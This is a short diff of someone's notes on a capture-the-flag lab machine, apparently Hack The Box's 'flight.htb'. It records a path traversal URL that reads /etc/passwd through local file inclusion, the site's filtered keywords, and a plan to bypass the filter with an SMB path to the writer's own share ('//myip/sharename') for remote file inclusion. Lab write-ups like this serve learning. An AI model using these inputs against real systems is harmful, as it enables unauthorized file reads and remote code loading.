@@ -13,10 +13,12 @@ bash
 - Looks like local file inclusion is possible 
 	- http://school.flight.htb/index.php?view=../../../../../etc/passwd
 	- But a site that says sus activity blocked
-	- Check out the php sourcecode (??!!!!?? IDK how the guy got the sourcecode...)
+	- Check out the php sourcecode (??!!!!?? IDK how the guy got the sourcecode...) 
+	--->update: Likely used the LFI to get the current dirs code
+	
 	- bunch of stuff is blocked in url like .. filter \\ htaccess and shtml 
 	- but // is allowed
-	- This means smb is allowed --> force the server to fetch from a remote source
+	- This means smb is allowed --> force the server to fetch from a remote source (RFI)
 	- //myip/sharename
 
 
